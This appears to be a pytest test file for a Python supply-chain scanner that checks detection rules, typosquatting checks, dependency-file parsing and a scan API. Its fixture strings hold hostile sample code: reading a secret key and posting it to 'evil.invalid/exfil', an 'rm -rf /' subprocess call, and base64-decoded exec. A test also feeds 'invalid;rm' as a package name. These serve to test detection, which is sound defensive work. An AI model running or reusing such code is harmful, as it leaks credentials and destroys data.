import pytest
from backend.guardian.py_engine import analyze_python, typo_pypi
from backend.guardian.py_dependencies import (
    parse_requirements_line,
    parse_requirements_txt,
    parse_pyproject_toml,
    parse_poetry_lock
)
from backend.guardian.pypi import validate_pypi_package, PyPISession

def test_py_engine_detects_security_signals():
    code = """
import os
import subprocess
import requests
import base64

def malicious():
    token = os.getenv("SECRET_API_KEY")
    requests.get("https://example.com/api")
    requests.post("https://evil.invalid/exfil", data={"secret": token})
    subprocess.run(["rm", "-rf", "/"])
    payload = base64.b64decode("cHJpbnQoJ2hlbGxvJyk=")
    exec(payload)
    open("/tmp/secret.txt", "w").write(token)
"""
    findings, coverage, count = analyze_python({"payload.py": code})
    assert count == 1
    rules = {f.rule for f in findings}
    assert 'CREDENTIAL_ACCESS' in rules
    assert 'NETWORK' in rules
    assert 'PROCESS_EXECUTION' in rules
    assert 'OBFUSCATED_EXECUTION' in rules or 'DYNAMIC_EXECUTION' in rules
    assert 'FILESYSTEM' in rules
    assert 'SENSITIVE_TRANSMISSION' in rules

def test_py_engine_typosquatting():
    assert typo_pypi('requsts') == 'requests'
    assert typo_pypi('ur1lib3') == 'urllib3'
    assert typo_pypi('requests') is None
    assert typo_pypi('unknownpackage123') is None

def test_parse_requirements_txt():
    content = """
# Production requirements
requests==2.31.0
urllib3>=1.21.1,<3
flask[async]==2.3.2
pytest
-r other.txt
"""
    deps, inspections = parse_requirements_txt(content)
    assert len(deps) == 4
    names = {d.name: d.version for d in deps}
    assert names['requests'] == '2.31.0'
    assert names['urllib3'] == '>=1.21.1,<3'
    assert names['flask'] == '2.3.2'
    assert names['pytest'] == 'unresolved'
    assert all(d.ecosystem == 'pypi' for d in deps)

def test_parse_pyproject_toml():
    content = """
[project]
name = "my-awesome-py-tool"
version = "1.2.3"
dependencies = [
    "requests==2.31.0",
    "click>=8.0.0"
]
"""
    deps, inspections, name, version = parse_pyproject_toml(content)
    assert name == "my-awesome-py-tool"
    assert version == "1.2.3"
    assert len(deps) == 2
    assert deps[0].name == "requests"
    assert deps[0].version == "2.31.0"
    assert deps[0].ecosystem == "pypi"

def test_parse_poetry_lock():
    content = """
[[package]]
name = "requests"
version = "2.31.0"
description = "Python HTTP for Humans."
optional = false
python-versions = ">=3.7"
files = [
    {file = "requests-2.31.0-py3-none-any.whl", hash = "sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f"}
]

[package.dependencies]
certifi = ">=2017.4.17"
charset-normalizer = ">=2,<4"
"""
    deps, inspections, digests, warnings = parse_poetry_lock(content)
    assert len(deps) == 1
    assert deps[0].name == "requests"
    assert deps[0].version == "2.31.0"
    assert deps[0].ecosystem == "pypi"
    assert len(digests) == 1
    assert "poetry.lock:requests@2.31.0" in digests
    assert digests["poetry.lock:requests@2.31.0"].startswith("sha256-")

def test_pypi_validation():
    validate_pypi_package("requests", "2.31.0")
    validate_pypi_package("flask-cors", "latest")
    with pytest.raises(ValueError, match="valid PyPI package"):
        validate_pypi_package("../invalid")
    with pytest.raises(ValueError, match="valid PyPI package"):
        validate_pypi_package("invalid;rm")


def test_engine_analyze_python_project():
    from backend.guardian.engine import analyze, assess
    files = {
        'requirements.txt': 'requests==2.31.0\nurllib3>=1.21.1\n',
        'app.py': '''
import os
import requests

def fetch():
    token = os.getenv("SECRET_TOKEN")
    requests.post("https://evil.invalid", data=token)
'''
    }
    name, version, findings, deps, coverage, count = analyze(files)
    assert count == 1
    assert len(deps) == 2
    assert any(d.name == 'requests' and d.ecosystem == 'pypi' for d in deps)
    assert any(f.rule == 'SENSITIVE_TRANSMISSION' for f in findings)
    risk, rationale = assess(findings)
    assert risk in ('High concern', 'Critical concern')

def test_pypi_api_submit_and_report(monkeypatch):
    import json
    from fastapi.testclient import TestClient
    from backend.guardian.main import app
    from backend.guardian import pypi

    client = TestClient(app)

    # Mock PyPISession.retrieve so test runs offline and deterministically
    fake_retrieved = pypi.Retrieved(
        metadata={'name': 'demo-py-pkg', 'version': '1.0.0', 'ecosystem': 'pypi'},
        files={
            'requirements.txt': 'requests==2.31.0\n',
            'demo/__init__.py': 'import os\nx = os.getenv("API_KEY")\n'
        },
        warnings=[],
        registry_integrity=pypi.IntegrityResult(status='verified', source='registry')
    )
    monkeypatch.setattr(pypi.PyPISession, 'retrieve', lambda self, name, version: fake_retrieved)

    res = client.post('/api/scans/package', json={'name': 'demo-py-pkg', 'version': '1.0.0', 'ecosystem': 'pypi'})
    assert res.status_code == 202
    job_id = res.json()['id']

    # Poll job until complete
    import time
    for _ in range(50):
        state = client.get(f'/api/jobs/{job_id}').json()
        if state['status'] != 'running':
            break
        time.sleep(0.05)

    assert state['status'] == 'complete'
    report = client.get(f'/api/scans/{job_id}').json()
    assert report['name'] == 'demo-py-pkg'
    assert report['version'] == '1.0.0'
    assert any(f['rule'] == 'CREDENTIAL_ACCESS' for f in report['findings'])
    assert any(d['name'] == 'requests' for d in report['dependencies'])
